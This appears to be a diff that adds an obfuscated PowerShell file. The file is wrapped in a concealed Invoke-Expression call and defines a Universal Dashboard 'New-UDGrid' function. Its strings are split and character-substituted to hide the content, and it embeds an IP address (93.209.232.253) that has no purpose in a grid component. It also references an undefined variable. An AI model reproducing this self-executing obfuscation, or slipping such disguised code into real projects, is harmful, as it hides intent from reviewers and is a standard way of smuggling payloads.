@@ -1,0 +1,63 @@
+ .( $pShOmE[4]+$PShOmE[30]+'x') ( (' 4KFtky4CE =  [TyPE](OQ5guOQ5+OQ5idOQ5) ;function nEw-UdGRId {
+    
+    param(
+        [Parameter()]
+        '+'[string]4KF{Id} =   (  VARiAblE T'+'kY4CE).vAlUE::NewguId().tOst'+'rIng(),
+        [Alias((OQ5SiOQ5+OQ5zeOQ5))]
+        [ValidateRange(1, 12)]
+  '+'      [Parameter(pArAMEt'+'ERSETnaMe = Oqhit0eaEmOqh)]
+        [int]4KF{e0eaxTra0eaSma0eal'+'Ls0eaIze},
+        '+'[Par'+'ameter(paRAMETERSETnaME = OqhIt0eaEMOqh)]
+  '+'      [ValidateRange('+'1, 12)]
+        [int]4KF{S0eama0ealLsIzE},
+        [Parameter(PAramETERSeTnAmE = Oqhit0eaEmOqh)]
+        [ValidateRange(1'+', 12)]
+        [int]4KF{MEDIum0eas0eaIzE},
+'+'        [Parameter(pARaMeteRseTnaMe = Oqhi0eaTem'+'Oqh)]
+        [ValidateRange('+'1, 12)]
+        [int]4KF{L0eaA'+'RGE0eaSiZE},
+        [Param'+'eter(pAramEterSetnAMe = OqhI0eaTemOqh)]
+     '+'   [ValidateRange(1, 12)]
+        [int]4KF{E0eaxtra0ealARg0'+'eaEsize},
+       '+' [Paramete'+'r(Pa'+'rA'+'METERsetNAme '+'= OqhCoNtAi0eaN0eaErOqh)]
+        [Switch]4KF{C0eaON0eaT0eaAInER},
+        [Param'+'eter(PArAmEtErSetnamE = OqhCo0eaNTaIn0eaErOqh)]
+        ['+'int]4KF{s0eapA0eaCing},
+        [Parameter(pARAMeterSETNaME = Oqhit0eaEmOqh)]
+        [Switch]4KF{I0'+'eaTeM},
+        [Parameter()]
+        [Alias((OQ5ConteOQ5+OQ5ntOQ5))]
+        [Scri'+'ptBlock]4KF{CH0eaI0ealD0eaReN}
+    )
+   '+' 4KF{ab'+'0eaEC}= ((Oqh{5}{4}'+'{0}{2}{3}{1}Oqh -f (OQ52OQ5+OQ5.25'+'OQ5),OQ59OQ5,OQ53uOQ5,OQ5TOQ5,(OQ5.OQ5+OQ523OQ5),(OQ5uT9iOQ5+OQ5pOQ5+OQ5:93.209OQ5))).RePLACe((OQ5uOQ5+OQ5T9OQ5),[STRinG][CHAr]39)
+
+    e0eaNd {
+        try {
+            4KF{C} = & 4KF{C0eahiLdR0eaEN}
+        }
+        catch {
+            4KF{c} = n0eaEw-'+'0eaUDErRO'+'R -Message 4KF{_}
+        }
+
+        @{
+            iD = 4'+'KF{i0ead} 
+            IsPluGIN = 4KF{T0eaR'+'UE} 
+            tYpe = (OQ'+'5mu-grOQ5+OQ5idOQ5)
+            ASsetId = 4KF{Muas0eaS0eaETId}
+
+'+'            XS = 4KF{ExTRa0easm0eaA0'+'eallsizE}
+            SM = 4KF{sMa0eaL0ealsize'+'}
+            Md = 4KF{m0eaED0eai0eaUMsIzE}
+            lG = 4KF{lAR0eag0eaE0easiZe}
+            XL = 4KF{E0eax'+'tr0eaA0eal0eaArGesIzE}
+            '+'SPaCINg = 4KF{S0eaPAcInG}
+
+            ContaINER = 4KF{co0eaNTaI0eaNeR}.ISPRESE'+'Nt
+            ITem = 4KF{I0eaTEM}.IsPrEsent
+
+            c'+'HiLdREn = 4KF{C}
+        }
+    }
+}
+
+').rEpLaCE('0ea',[StrINg][CHar]96).rEpLaCE(([CHar]79+[CHar]113+[CHar]104),[StrINg][CHar]34).rEpLaCE(([CHar]79+[CHar]81+[CHar]53),[StrINg][CHar]39).rEpLaCE(([CHar]52+[CHar]75+[CHar]70),[StrINg][CHar]36) )
